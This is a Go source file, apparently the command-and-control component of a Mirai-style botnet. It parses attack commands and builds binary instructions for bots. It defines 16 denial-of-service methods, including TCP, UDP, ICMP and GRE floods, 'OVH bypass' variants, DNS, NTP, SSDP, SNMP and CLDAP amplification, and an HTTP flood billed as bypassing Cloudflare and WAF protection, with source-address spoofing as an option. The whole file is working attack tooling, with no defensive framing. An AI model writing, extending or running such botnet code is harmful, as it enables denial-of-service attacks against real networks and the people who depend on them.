package main

import (
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

/* ============================================================================
 * ATTACK PARSER & BUILDER - 16 Attack Methods
 * ============================================================================
 * Layer 4: TCP, UDP, ICMP, GRE, OVH bypass, Amplification
 * Layer 7: HTTP flood, AXIS-L7 (browser emulation + CF bypass)
 * Combined: AXIS-TCP, AXIS-UDP (multi-vector attacks)
 * ============================================================================ */

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8
	Flags    map[uint8]string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len":       FlagInfo{0, "Size of packet data, default is 1400 bytes"},
	"rand":      FlagInfo{1, "Randomize packet data content, default is 1 (yes)"},
	"tos":       FlagInfo{2, "TOS field value in IP header, default is 0"},
	"ident":     FlagInfo{3, "ID field value in IP header, default is random"},
	"ttl":       FlagInfo{4, "TTL field value in IP header, default is 64"},
	"df":        FlagInfo{5, "Set the Dont-Fragment bit in IP header, default is 0"},
	"sport":     FlagInfo{6, "Source port, default is random"},
	"dport":     FlagInfo{7, "Destination port, default is random"},
	"domain":    FlagInfo{8, "Domain name to attack"},
	"method":    FlagInfo{9, "HTTP method name, default is GET"},
	"path":      FlagInfo{11, "HTTP path, default is /"},
	"conns":     FlagInfo{12, "Number of connections"},
	"source":    FlagInfo{13, "Source IP address, 255.255.255.255 for random"},
	"url":       FlagInfo{14, "Full HTTP/HTTPS URL (e.g., http://example.com/path)"},
	"https":     FlagInfo{15, "Use HTTPS/SSL (0 or 1)"},
	"useragent": FlagInfo{16, "User-Agent string for HTTP requests"},
	"cookies":   FlagInfo{17, "Cookies for HTTP requests (for CF bypass)"},
	"referer":   FlagInfo{18, "Referer header for HTTP requests"},
	"size":      FlagInfo{0, "Size of packet data (alias for len)"},
	"port":      FlagInfo{7, "Destination port (alias for dport)"},
	/* AXIS-TCP/AXIS-UDP specific flags */
	"tcpport":   FlagInfo{19, "TCP port for AXIS-TCP"},
	"udpport":   FlagInfo{20, "UDP port for AXIS-UDP"},
	"greport":   FlagInfo{21, "GRE port for AXIS-TCP/AXIS-UDP"},
}

/*
 * Attack method IDs - 16 optimized methods
 * Must match bot/attack.h ATK_VEC_* values
 */
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	/* Core Attacks */
	"tcp":      AttackInfo{0, []uint8{0, 1, 6, 7, 13}, "TCP flood optimized for Gbps"},
	"udp":      AttackInfo{1, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
	"http":     AttackInfo{2, []uint8{7, 8, 9, 11, 12, 14}, "HTTP flood optimized for RPS"},
	
	/* OVH Bypass */
	"ovhtcp":   AttackInfo{3, []uint8{0, 1, 6, 7, 13}, "TCP with OVH Game bypass"},
	"ovhudp":   AttackInfo{4, []uint8{0, 1, 6, 7, 13}, "UDP with OVH Game bypass"},

	/* ICMP & GRE */
	"icmp":     AttackInfo{5, []uint8{0, 13}, "ICMP ping flood (no port needed)"},
	"greip":    AttackInfo{6, []uint8{0, 1, 6, 7, 13}, "GRE IP flood"},
	"greeth":   AttackInfo{7, []uint8{0, 1, 6, 7, 13}, "GRE Ethernet flood"},

	/* AXIS Methods */
	"axis-l7":  AttackInfo{8, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "AXIS-L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
	"axis-tcp": AttackInfo{9, []uint8{0, 1, 6, 7, 19, 21, 13}, "AXIS-TCP - TCP+OVH-TCP+ICMP+GRE combined attack"},
	"axis-udp": AttackInfo{10, []uint8{0, 1, 6, 7, 20, 21, 13}, "AXIS-UDP - UDP+AMP+VSE+ICMP+GRE combined attack"},

	/* Amplification Attacks */
	"dns-amp":  AttackInfo{11, []uint8{6, 13}, "DNS Amplification (50x-100x)"},
	"ntp-amp":  AttackInfo{12, []uint8{6, 13}, "NTP Amplification (100x-500x)"},
	"ssdp-amp": AttackInfo{13, []uint8{6, 13}, "SSDP Amplification (30x-50x)"},
	"snmp-amp": AttackInfo{14, []uint8{6, 13}, "SNMP Amplification (50x-100x)"},
	"cldap-amp": AttackInfo{15, []uint8{6, 13}, "CLDAP Amplification (50x-70x)"},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, err := shellwords.Parse(str)
	if err != nil {
		return nil, errors.New("Failed to parse attack command")
	}

	if len(args) < 3 {
		return nil, errors.New("Invalid attack command (need method, target, duration)")
	}

	// Parse attack method
	if atkInfo, ok := attackInfoLookup[args[0]]; !ok {
		return nil, errors.New("Unknown attack method: " + args[0])
	} else {
		atk.Type = atkInfo.attackID
	}

	// Check if this is an HTTP/HTTPS attack
	isHTTPAttack := atk.Type == 2 || atk.Type == 8  // HTTP or AXIS-L7

	if isHTTPAttack {
		targetURL := args[1]

		if strings.HasPrefix(targetURL, "http://") || strings.HasPrefix(targetURL, "https://") {
			domain := extractDomainFromURL(targetURL)
			if domain != "" {
				atk.Flags[8] = domain
			}

			path := extractPathFromURL(targetURL)
			if path != "" && atk.Flags[22] == "" {
				atk.Flags[22] = path
			}

			if strings.HasPrefix(targetURL, "https://") {
				atk.Flags[31] = "1"
			}
		} else {
			atk.Flags[8] = args[1]
			atk.Flags[22] = "/"
		}

		atk.Duration = 1
		for i := 2; i < len(args); i++ {
			parts := strings.SplitN(args[i], "=", 2)
			if len(parts) != 2 {
				continue
			}

			if flagInfo, ok := flagInfoLookup[parts[0]]; ok {
				if !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) {
					continue
				}
				atk.Flags[flagInfo.flagID] = parts[1]
			}
		}

		if atk.Flags[31] == "1" && atk.Flags[7] == "" {
			atk.Flags[7] = "443"
		} else if atk.Flags[7] == "" {
			atk.Flags[7] = "80"
		}

	} else {
		// Parse target (IP or domain)
		if ip := net.ParseIP(args[1]); ip != nil {
			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
		} else {
			if ips, err := net.LookupIP(args[1]); err == nil {
				for _, ip := range ips {
					if ip.To4() != nil {
						atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
					}
				}
			} else {
				return nil, errors.New("Failed to resolve domain: " + args[1])
			}
		}

		// Parse duration
		if dur, err := strconv.Atoi(args[2]); err == nil {
			atk.Duration = uint32(dur)
		} else {
			return nil, errors.New("Invalid duration value")
		}

		// Parse flags
		for i := 3; i < len(args); i++ {
			parts := strings.SplitN(args[i], "=", 2)
			if len(parts) != 2 {
				continue
			}

			if flagInfo, ok := flagInfoLookup[parts[0]]; ok {
				if !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) {
					continue
				}
				atk.Flags[flagInfo.flagID] = parts[1]
			}
		}
	}

	return atk, nil
}

func extractDomainFromURL(url string) string {
	if strings.HasPrefix(url, "http://") {
		url = url[7:]
	} else if strings.HasPrefix(url, "https://") {
		url = url[8:]
	}

	if idx := strings.Index(url, "/"); idx != -1 {
		url = url[:idx]
	}

	if idx := strings.Index(url, ":"); idx != -1 {
		url = url[:idx]
	}

	return url
}

func extractPathFromURL(url string) string {
	if strings.HasPrefix(url, "http://") {
		url = url[7:]
	} else if strings.HasPrefix(url, "https://") {
		url = url[8:]
	}

	if idx := strings.Index(url, "/"); idx != -1 {
		return url[idx:]
	}

	return "/"
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)

	// Append attack type
	buf = append(buf, this.Type)

	// Append target count
	buf = append(buf, byte(len(this.Targets)))

	// Append targets
	for addr, netmask := range this.Targets {
		buf = append(buf, byte(addr>>24), byte(addr>>16), byte(addr>>8), byte(addr))
		buf = append(buf, netmask)
	}

	// Append flag count
	buf = append(buf, byte(len(this.Flags)))

	// Append flags
	for key, val := range this.Flags {
		buf = append(buf, key)
		buf = append(buf, byte(len(val)))
		buf = append(buf, []byte(val)...)
	}

	// Append duration
	buf = append(buf, byte(this.Duration>>24), byte(this.Duration>>16), byte(this.Duration>>8), byte(this.Duration))

	return buf, nil
}
